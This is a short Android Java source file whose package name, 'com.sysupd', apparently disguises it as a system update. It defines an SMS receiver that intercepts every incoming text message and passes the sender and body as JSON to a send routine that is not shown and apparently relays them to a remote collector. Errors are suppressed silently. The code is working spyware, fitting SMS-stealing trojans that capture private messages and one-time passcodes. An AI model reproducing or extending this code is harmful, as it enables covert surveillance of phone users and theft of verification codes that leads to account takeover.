package com.sysupd;

import android.content.*;
import android.provider.Telephony;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
    public void onReceive(Context ctx, Intent intent) {
        try {
            SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent);
            if (msgs == null) return;
            for (SmsMessage m : msgs) {
                String from = m.getOriginatingAddress();
                String body = m.getMessageBody();
                Core.send("SMS", "{\"from\":\"" + from +
                    "\",\"body\":\"" + body.replace("\"","'") + "\"}");
            }
        } catch (Exception e) {}
    }
}
